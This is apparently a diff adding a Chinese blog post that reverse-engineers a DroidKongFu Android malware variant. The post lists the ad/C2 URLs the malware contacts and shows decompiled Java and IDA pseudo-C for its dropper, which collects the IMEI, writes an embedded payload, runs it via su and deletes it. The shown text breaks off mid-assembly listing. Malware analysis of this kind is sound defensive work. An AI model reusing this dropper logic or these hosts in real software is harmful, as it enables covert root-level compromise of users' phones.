@@ -1,0 +1,812 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+  
+
+    <head>
+      <meta charset="utf-8" />
+       
+      <meta name="keywords" content="生活，思考 ，渗透，审计，代码。。。" />
+       
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>DroidKonngFu变种病毒实例分析 |  小透的少年江湖</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/haoyun.ico" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      
+<link rel="stylesheet" href="/css/fonts/remixicon.css">
+
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    </head>
+  </html>
+</html>
+
+
+<body>
+  <div id="app">
+    
+      
+      <canvas width="1777" height="841"
+        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-DroidKonngFu变种病毒实例分析"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  DroidKonngFu变种病毒实例分析
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2023/03/12/DroidKonngFu%E5%8F%98%E7%A7%8D%E7%97%85%E6%AF%92%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90/" class="article-date">
+  <time datetime="2023-03-12T12:14:28.000Z" itemprop="datePublished">2023-03-12</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/">逆向分析</a> / <a class="article-category-link" href="/categories/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/android/">android</a> / <a class="article-category-link" href="/categories/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/android/%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/">案例分析</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">7.5k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">37 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="DroidKonngFu变种病毒实例分析"><a href="#DroidKonngFu变种病毒实例分析" class="headerlink" title="DroidKonngFu变种病毒实例分析"></a>DroidKonngFu变种病毒实例分析</h1><p>DroidKongFu病毒的主体是一个Android原生程序，通常被捆绑到正常的Android软件中，用户只要安装遭到捆绑的软件就会被感染该病毒。</p>
+<h2 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h2><p>病毒分析讲究先动后静的分析步骤。首先动态分析捕获病毒执行的所有敏感操作，观察病毒运行时的症状，在了解病毒实现的功能后，再使用静态分析技术逆向病毒的功能代码，理清病毒的执行逻辑路线。</p>
+<p>这里使用几款Android程序在线动态分析工具进行动态分析对照。分析得出APP基本信息以及其涉及的域名和访问的URL信息。</p>
+<img src="/2023/03/12/DroidKonngFu%E5%8F%98%E7%A7%8D%E7%97%85%E6%AF%92%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90/image-20231009163520372.png" class title="image-20231009163520372">
+
+<img src="/2023/03/12/DroidKonngFu%E5%8F%98%E7%A7%8D%E7%97%85%E6%AF%92%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90/image-20231009163927926.png" class title="image-20231009163927926">
+
+<img src="/2023/03/12/DroidKonngFu%E5%8F%98%E7%A7%8D%E7%97%85%E6%AF%92%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90/image-20231009163857255.png" class title="image-20231009163857255">
+
+<p>该app中还存在一些访问外部网站的URL</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">http://ad.imadpush.com:7500/AppManager/index.php/AppPoster/mgPdownLog/down?appid=</span><br><span class="line">http://dd.phonego8.com:7500/ad/nadp.php?v=1.5&amp;id=</span><br><span class="line">http://n.wiyun.com/hsup/spi?device_id=</span><br><span class="line">http://e.domob.cn/report</span><br><span class="line">http://amob.acs86.com/a.htm?pv=1&amp;sp=</span><br><span class="line">http://r.domob.cn/a/</span><br><span class="line">http://d.wiyun.com/adv/d?t=</span><br><span class="line">http://cast.ra.imocha.com/p/?pid=</span><br><span class="line">http://dd.phonego8.com:7500/ad/nadp.php?v=1.5&amp;id=all</span><br><span class="line">http://dd.phonego8.com:7500/ad/nweb.php?v=1.5&amp;u=</span><br><span class="line">http://&#123;0&#125;/&#123;1&#125;</span><br><span class="line">http://r2.adwo.com/adweb</span><br><span class="line">http://amob.acs86.com/mst.htm?version=2.3.6</span><br><span class="line">http://www.facebook.com/otothel.apps</span><br><span class="line">http://proxy.youdraw.cn/api/proxy</span><br></pre></td></tr></table></figure>
+
+<p>访问一下看看</p>
+<img src="/2023/03/12/DroidKonngFu%E5%8F%98%E7%A7%8D%E7%97%85%E6%AF%92%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90/image-20231009164613834.png" class title="image-20231009164613834">
+
+<p>根据以上的分析可以得出病毒大概执行的动作：</p>
+<ul>
+<li>获取手机敏感数据</li>
+<li>访问外部网站</li>
+<li>对手机进行了定位</li>
+</ul>
+<p>但这些信息还不足以理解病毒的完整运行过程，如病毒体的释放、系统目录读取等操作。</p>
+<h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><p>下面我们将从代码层面对病毒进行静态分析。DroidKongFu通过java层的Native函数启动病毒外壳，然后由病毒外壳来启动真正的病毒分析，所以主要从java层，Native启动层和核心层这三个方面来对其进行分析。</p>
+<h3 id="java层"><a href="#java层" class="headerlink" title="java层"></a>java层</h3><p>在AndroidManifest.xml文件中可以得到如下信息</p>
+<img src="/2023/03/12/DroidKonngFu%E5%8F%98%E7%A7%8D%E7%97%85%E6%AF%92%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90/image-20231009170409427.png" class title="image-20231009170409427">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Activity: </span><br><span class="line">MainActivity    ad.imadpush.com.poster.PosterInfoActivity</span><br><span class="line"></span><br><span class="line">Service: </span><br><span class="line">com.airpuh.ad.UpdateCheck    ad.imadpush.com.poster.AlarmService</span><br><span class="line"></span><br><span class="line">BroadcastReceiver: </span><br><span class="line">ad.imadpush.com.poster.ReceiverAlarm</span><br><span class="line"></span><br><span class="line">使用到以下权限：</span><br><span class="line">&lt;uses-permission android:name=&quot;android.permission.INTERNET&quot;/&gt;</span><br><span class="line">    &lt;uses-permission android:name=&quot;android.permission.ACCESS_NETWORK_STATE&quot;/&gt;</span><br><span class="line">    &lt;uses-permission android:name=&quot;android.permission.ACCESS_WIFI_STATE&quot;/&gt;</span><br><span class="line">    &lt;uses-permission android:name=&quot;android.permission.READ_PHONE_STATE&quot;/&gt;</span><br><span class="line">    &lt;uses-permission android:name=&quot;android.permission.ACCESS_COARSE_LOCATION&quot;/&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>下面为MainActivity类的代码，前面主要是对程序运行时出现的两个按钮关联事件。首先判断移动设备是否以及是ROOT权限，对解锁和开始这两个按钮进行说明.这都是原程序本来的功能，接下来就是病毒需要做的事情。</p>
+<img src="/2023/03/12/DroidKonngFu%E5%8F%98%E7%A7%8D%E7%97%85%E6%AF%92%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90/image-20231009214542129.png" class title="image-20231009214542129">
+
+<img src="/2023/03/12/DroidKonngFu%E5%8F%98%E7%A7%8D%E7%97%85%E6%AF%92%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90/image-20231009214622105.png" class title="image-20231009214622105">
+
+<p>关键代码如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#启动广告接受线程</span><br><span class="line">this.mAd2 = new NewAd(this);</span><br><span class="line">this.mAd2.startAd();</span><br><span class="line">#启动全局定时器</span><br><span class="line">new f(this);</span><br><span class="line">#启动服务</span><br><span class="line">Intent intent = new Intent();</span><br><span class="line">intent.setClass(this, UpdateCheck.class);</span><br><span class="line">startService(intent);</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>1.启动广告接收线程</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.mAd2 = <span class="keyword">new</span> NewAd(<span class="keyword">this</span>);</span><br><span class="line"><span class="keyword">this</span>.mAd2.startAd();</span><br></pre></td></tr></table></figure>
+
+<p>首先实例化一个NewAd对象，然后调用其startAd()方法，startAd()方法代码如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startAd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> g(<span class="keyword">this</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>新建了一个g对象并调用了它的start()方法，跟踪g类代码原来是个线程类，所以Thread对象的start()方法执行的是它的run()方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">g</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="comment">/* synthetic */</span> NewAd a;</span><br><span class="line"></span><br><span class="line">    g(NewAd newAd) &#123;</span><br><span class="line">        <span class="keyword">this</span>.a = newAd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (!(<span class="keyword">this</span>.a.a)) &#123;</span><br><span class="line">            <span class="keyword">this</span>.a.a();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sleep(<span class="number">5000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>run()方法是一段循环代码，调用了NewAd类的a()方法，主要工作是访问网址”<a target="_blank" rel="noopener" href="http://dd.phonego8.com:7500/ad/nadp.php?v=1.5&amp;id=all&quot;%E5%B9%B6%E8%A7%A3%E6%9E%90%E8%BF%94%E5%9B%9E%E7%9A%84%E7%BB%93%E6%9E%9C%EF%BC%8C%E6%A0%B9%E6%8D%AE%E4%B8%8D%E5%90%8C%E7%9A%84%E8%BF%94%E5%9B%9E%E7%BB%93%E6%9E%9C%E8%B0%83%E7%94%A8%E4%B8%8D%E5%90%8C%E7%9A%84%E6%96%B9%E6%B3%95%EF%BC%8C%E5%B9%B6%E8%AE%BE%E7%BD%AEa%E7%9A%84%E5%80%BC%E4%B8%BAtrue%E3%80%82%E5%85%B6%E5%AE%9E%E5%B0%B1%E6%98%AF%E8%AF%B7%E6%B1%82%E4%B8%8D%E5%90%8C%E5%B9%BF%E5%91%8A%E5%95%86%E7%9A%84push%E5%B9%BF%E5%91%8A%E3%80%82">http://dd.phonego8.com:7500/ad/nadp.php?v=1.5&amp;id=all&quot;并解析返回的结果，根据不同的返回结果调用不同的方法，并设置a的值为true。其实就是请求不同广告商的push广告。</a></p>
+<img src="/2023/03/12/DroidKonngFu%E5%8F%98%E7%A7%8D%E7%97%85%E6%AF%92%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90/image-20231009221358293.png" class title="image-20231009221358293">
+
+<p><strong>2.启动全局定时器</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new f(this);</span><br></pre></td></tr></table></figure>
+
+<p>f类在初始化时执行了两个方法a()方法和b()方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">a</span><span class="params">(Activity activity, <span class="keyword">boolean</span> z)</span> </span>&#123;</span><br><span class="line">       l.a = z;</span><br><span class="line">       a = activity;</span><br><span class="line">       <span class="keyword">this</span>.g = m.b(activity);<span class="comment">//获取userid值</span></span><br><span class="line">       d = activity.getSharedPreferences(<span class="string">&quot;jmuser&quot;</span>, <span class="number">0</span>);<span class="comment">//打开SharedPreferences中的jmuser.xml文件</span></span><br><span class="line">       d.edit().putLong(<span class="string">&quot;dId&quot;</span>, <span class="keyword">this</span>.g.longValue()).commit();<span class="comment">//将did和userid写入文件</span></span><br><span class="line">       <span class="keyword">new</span> c(<span class="keyword">this</span>).execute(<span class="keyword">null</span>, <span class="number">0</span>, <span class="keyword">null</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>a()方法中调用m.b()访问目标网址来获取userid值用来标识一个“合法”的用户，每个感染该病毒的手机通过这个userid获取广告，并将其和did一起写入SharedPreferences的jmuser.xml文件。</p>
+<p>b()方法启动了一个周期为360000毫秒的全局定时器，对象为ReceiverAlarm.</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">b</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        e = PendingIntent.getBroadcast(a, <span class="number">0</span>, <span class="keyword">new</span> Intent(a, ReceiverAlarm.class), <span class="number">0</span>);<span class="comment">//定义ReceiverAlarm</span></span><br><span class="line">        Calendar instance = Calendar.getInstance();<span class="comment">//构造一个pendingintent对象</span></span><br><span class="line">        instance.setTimeInMillis(System.currentTimeMillis());</span><br><span class="line">        l.a(<span class="keyword">new</span> SimpleDateFormat(<span class="string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>).format(<span class="keyword">new</span> Date(instance.getTimeInMillis())));</span><br><span class="line">        c = (AlarmManager) a.getSystemService(<span class="string">&quot;alarm&quot;</span>);<span class="comment">//获取系统定时服务</span></span><br><span class="line">        c.setRepeating(<span class="number">0</span>, instance.getTimeInMillis(), <span class="number">360000</span>, e);<span class="comment">//启动定时器</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>ReceiverAlarm类的OnReceive()方法只有一行代码，启动了AlarmService服务</p>
+<img src="/2023/03/12/DroidKonngFu%E5%8F%98%E7%A7%8D%E7%97%85%E6%AF%92%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90/image-20231010163858146.png" class title="image-20231010163858146">
+
+<p>AlarmService类中的onStart()方法在服务启动时获取系统的通知服务，然后调用AsyncTask的execute来向用户发送通知，诱骗用户安装广告服务。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public void onStart(Intent intent, int i) &#123;</span><br><span class="line">       super.onStart(intent, i);</span><br><span class="line">       this.d = f.a;</span><br><span class="line">       this.e = Long.valueOf(f.d.getLong(&quot;userId&quot;, 0));</span><br><span class="line">       this.g = Long.valueOf(f.d.getLong(&quot;dId&quot;, 0));</span><br><span class="line">       a();</span><br><span class="line">       new g(this).execute(null, 0, null);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>3.启动恶意服务</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Intent intent = new Intent();</span><br><span class="line">intent.setClass(this, UpdateCheck.class);</span><br><span class="line">startService(intent);</span><br></pre></td></tr></table></figure>
+
+<p>通过上面三行代码启动恶意服务，启动了名称为updatecheck的服务，病毒主体就是通过它来启动的。我们跟踪该服务代码，它定义了一个静态方法用于加载原生动态链接库vadgo。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">static &#123;</span><br><span class="line">    System.loadLibrary(&quot;vadgo&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>onCreate()方法获取了mCh、mId、mPkg这三个成员变量，分别记录了元数据MYAD_PID、设备的IMEI和程序包名，然后启动了线程。该线程run()方法中通过调用DataInit()来对三个值进行传递。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Object value2 = getPackageManager().getApplicationInfo(getPackageName(), <span class="number">128</span>).metaData.get(<span class="string">&quot;MYAD_PID&quot;</span>);<span class="comment">//获取元数据</span></span><br><span class="line">        <span class="keyword">if</span> (value2 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.mCh = (String) value2;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.mId = ((TelephonyManager) getSystemService(<span class="string">&quot;phone&quot;</span>)).getDeviceId();<span class="comment">//获取IMEI</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.mId == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.mId = Settings.System.getString(getContentResolver(), <span class="string">&quot;android_id&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.mPkg = getPackageName();<span class="comment">//获取包名</span></span><br><span class="line">    <span class="keyword">new</span> Thread() &#123;</span><br><span class="line">        <span class="comment">/* class com.airpuh.ad.UpdateCheck.AnonymousClass1 */</span></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            UpdateCheck.<span class="keyword">this</span>.DataInit(UpdateCheck.<span class="keyword">this</span>.mId, UpdateCheck.<span class="keyword">this</span>.mCh, UpdateCheck.<span class="keyword">this</span>.mPkg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;.start();<span class="comment">//启动线程</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>DataInit()是一个Native方法，将mCh、mId、mPkg这三个值传递过去，这里代码就从java层进入到了Native层。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public native boolean DataInit(String str, String str2, String str3);</span><br></pre></td></tr></table></figure>
+
+<h3 id="Native层"><a href="#Native层" class="headerlink" title="Native层"></a>Native层</h3><p>使用IDA打开libvadgo.so文件，首先可以在导出表中定位java_com_airpuh_ad_UpdateCheck_DataInit函数</p>
+<img src="/2023/03/12/DroidKonngFu%E5%8F%98%E7%A7%8D%E7%97%85%E6%AF%92%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90/image-20231010173114906.png" class title="image-20231010173114906">
+
+<p>在IDA中按f5获取c语言代码，该片段代码如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">#释放病毒主体</span><br><span class="line"><span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));  <span class="comment">//对s进行初始化，清空存储空间用来存入sprintf组成的字符串</span></span><br><span class="line">time(&amp;timer);   <span class="comment">//返回当前时间</span></span><br><span class="line">srand48(timer);  <span class="comment">//初始化timer</span></span><br><span class="line">v11 = lrand48();   <span class="comment">//获取一个正的长整型随机数，获取系统时间作为随机数种子</span></span><br><span class="line"><span class="built_in">sprintf</span>(s, <span class="string">&quot;%s/%s/.e%dd&quot;</span>, <span class="string">&quot;/data/data&quot;</span>, v9, v11);</span><br><span class="line">v12 = open(s, <span class="number">578</span>, <span class="number">384</span>);  <span class="comment">//创建恶意文件</span></span><br><span class="line"></span><br><span class="line">#判断程序路径以及开启su权限的管道</span><br><span class="line"><span class="keyword">if</span> ( v12 &gt;= <span class="number">0</span></span><br><span class="line">      &amp;&amp; (v14 = (<span class="keyword">char</span> *)write(v12, &amp;_bindata, (<span class="keyword">size_t</span>)aEncodingUtf8St),  <span class="comment">//写入恶意文件</span></span><br><span class="line">          close(v13),</span><br><span class="line">          sync(),</span><br><span class="line">          sync(),</span><br><span class="line">          chmod(s, <span class="number">0x1ED</span>u),  <span class="comment">//加上可执行权限</span></span><br><span class="line">          v14 == aEncodingUtf8St)</span><br><span class="line">      &amp;&amp; (!access(SYS_BIN_SU, <span class="number">0</span>) ? (v19 = popen(SYS_BIN_SU, <span class="string">&quot;w&quot;</span>)) : (v19 = popen(SYS_XBIN_SU, <span class="string">&quot;w&quot;</span>)), v19) )</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//执行病毒主体</span></span><br><span class="line">    <span class="built_in">memset</span>(v22, <span class="number">0</span>, <span class="number">0xFF</span>u);</span><br><span class="line">      <span class="built_in">sprintf</span>(v22, <span class="string">&quot;%s %s %s\n&quot;</span>, CMD_SET_PROP, PROP_RUNNING_ID, v7);</span><br><span class="line">      v15 = <span class="built_in">strlen</span>(v22);</span><br><span class="line">      fwrite(v22, <span class="number">1u</span>, v15, v19);</span><br><span class="line">      fflush(v19);</span><br><span class="line">      <span class="built_in">memset</span>(v22, <span class="number">0</span>, <span class="number">0xFF</span>u);</span><br><span class="line">      <span class="built_in">sprintf</span>(v22, <span class="string">&quot;%s %s %s\n&quot;</span>, CMD_SET_PROP, PROP_RUNNING_CH, v8);</span><br><span class="line">      v16 = <span class="built_in">strlen</span>(v22);</span><br><span class="line">      fwrite(v22, <span class="number">1u</span>, v16, v19);</span><br><span class="line">      fflush(v19);</span><br><span class="line">      <span class="built_in">memset</span>(v22, <span class="number">0</span>, <span class="number">0xFF</span>u);</span><br><span class="line">      <span class="built_in">sprintf</span>(v22, <span class="string">&quot;%s\n&quot;</span>, s);</span><br><span class="line">      v17 = <span class="built_in">strlen</span>(v22);</span><br><span class="line">      fwrite(v22, <span class="number">1u</span>, v17, v19);</span><br><span class="line">      fflush(v19);</span><br><span class="line">      <span class="built_in">memset</span>(v22, <span class="number">0</span>, <span class="number">0xFF</span>u);</span><br><span class="line">      <span class="built_in">strcpy</span>(v22, <span class="string">&quot;exit\n&quot;</span>);</span><br><span class="line">      v18 = <span class="built_in">strlen</span>(v22);</span><br><span class="line">      fwrite(v22, <span class="number">1u</span>, v18, v19);</span><br><span class="line">      fflush(v19);</span><br><span class="line">      pclose(v19);</span><br><span class="line">      sleep(<span class="number">0x12C</span>u);</span><br><span class="line">      unlink(s);      <span class="comment">//删除文件</span></span><br><span class="line">      result = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>开始代码如下：</p>
+<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">0000093</span>C <span class="comment">; __unwind &#123;</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000093</span>C                 <span class="keyword">PUSH</span>    &#123;<span class="built_in">R4</span>-<span class="built_in">R7</span>,<span class="built_in">LR</span>&#125;  <span class="comment">;将R4-R7以及LR寄存器的值压入堆栈</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000093</span>E                 <span class="keyword">MOV</span>     <span class="built_in">R7</span>, <span class="built_in">R11</span>     <span class="comment">;下面四行是将R8-R11的寄存值保存在R4-R7</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000940</span>                 <span class="keyword">MOV</span>     <span class="built_in">R6</span>, <span class="built_in">R10</span>      </span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000942</span>                 <span class="keyword">MOV</span>     <span class="built_in">R5</span>, <span class="built_in">R9</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000944</span>                 <span class="keyword">MOV</span>     <span class="built_in">R4</span>, <span class="built_in">R8</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000946</span>                 <span class="keyword">PUSH</span>    &#123;<span 